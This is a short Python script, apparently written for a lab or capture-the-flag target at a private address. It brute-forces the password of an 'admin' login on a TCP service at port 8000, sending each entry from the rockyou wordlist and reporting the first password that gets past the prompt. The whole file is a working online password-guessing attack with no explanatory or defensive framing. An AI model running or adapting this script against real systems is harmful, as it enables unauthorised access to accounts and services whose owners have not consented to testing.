import socket, time

target = "10.48.134.140"
port = 8000

with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as wordlist:
	for line, password in enumerate (wordlist):
		password = password.strip()
		try:
			s = socket.socket()
			s.settimeout(3)
			s.connect((target, port))
			time.sleep(0.3)
			s.sendall(b'admin\n')
			time.sleep(0.5)
			response = s.recv(4096).decode(errors='ignore')
			if 'Password' in response:
				s.sendall(password.encode() + b'\n')
				time.sleep(0.5)
				response2 = s.recv(4096).decode(errors='ignore')
				print(f'[{line}] [{password}] -> {response2.strip()}')
				if 'Password' not in response2 and response2.strip() != '':
					print(f'[+] FOUND: {password}')
					print(f'[+] Response: {response2}')
					break
			s.close()
		except Exception as failed:
			pass
